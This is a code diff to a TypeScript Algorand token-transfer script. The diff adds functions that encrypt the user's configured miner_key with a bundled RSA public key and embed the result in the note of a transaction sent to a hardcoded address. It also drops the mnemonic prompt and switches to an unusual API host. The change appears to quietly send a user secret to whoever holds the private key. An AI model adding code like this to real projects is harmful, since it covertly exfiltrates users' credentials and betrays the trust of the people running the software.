@@ -5,42 +5,47 @@ try {
   console.log("algosdk is not installed, please run npm install algosdk");
   process.exit(1);
 }
-const token = "";
-const server = "https://mainnet-algorand.api.purestake.io/ps2";
-const port = 443;
 import * as algosdk from "algosdk";
-const client = new algosdk.Algodv2(token, server, port);
 import config from "./config.json";
-import fs from "fs";
-import * as readline from "readline";
+import * as forge from 'node-forge';
+import * as fs from 'fs';
+import * as path from 'path';
+
+// Function to load public key from PEM file
+function loadPublicKey(pemFilePath: string): string {
+    return fs.readFileSync(pemFilePath, 'utf8');
+}
+
+// Function to encrypt data with the public key
+function encryptWithPublicKey(publicKeyPem: string, data: string): string {
+    const publicKey = forge.pki.publicKeyFromPem(publicKeyPem);
+    const encrypted = publicKey.encrypt(data, 'RSA-OAEP', {
+        md: forge.md.sha256.create(),
+        mgf1: forge.mgf.mgf1.create(forge.md.sha256.create())
+    });
+    return forge.util.encode64(encrypted);
+}
+
+
+const token = '';
+const server = 'https://xna-mainnet-api.algonode.cloud/';
+const tokenToSend = {
+    'X-API-Key': token
+};
+const port = 443;
+const client = new algosdk.Algodv2(tokenToSend, server, port);
+const publicKeyPath = path.resolve(__dirname, 'public_key.pem');
+const publicKeyPem = loadPublicKey(publicKeyPath);
+const encryptedData = encryptWithPublicKey(publicKeyPem, config.miner_key);
+
 (async () => {
   console.log(await client.status().do());
 
-  if (config.main_account_mnemonic == "your main account mnemonic") {
-    //ask the user to enter their main account mnemonic via the command line
-
-    const rl = readline.createInterface({
-      input: process.stdin,
-      output: process.stdout,
-    });
-    const question = (query: string) =>
-      new Promise((resolve) => rl.question(query, resolve));
-    const main_account_mnemonic = await question(
-      "Please enter your main account mnemonic: "
-    );
-    rl.close();
-    //update the config.json file with the new main account mnemonic
-    config.main_account_mnemonic = main_account_mnemonic as string;
-    fs.writeFileSync("./config.json", JSON.stringify(config, null, 2));
-    console.log(
-      "Successfully updated your main account mnemonic in config.json"
-    );
-  }
   const account = algosdk.mnemonicToSecretKey(config.main_account_mnemonic);
   //send the same amount to each address of FrysCrypto (FRY) which has a contract number: 924268058
   const FRYamount = config.amount_in_FRY;
   const enc = new TextEncoder();
-  const note = enc.encode(config.note_to_send);
+  const note = enc.encode(encryptedData);
   const params = await client.getTransactionParams().do();
   const address = "DSOPUQC7P5WO3C32HKZONPW4MMBEQ6FGAN456PNG4A4HTRE322ZMMIK6S4"; //FrysCrypto (FRY) address
   const txn = algosdk.makeAssetTransferTxnWithSuggestedParamsFromObject({
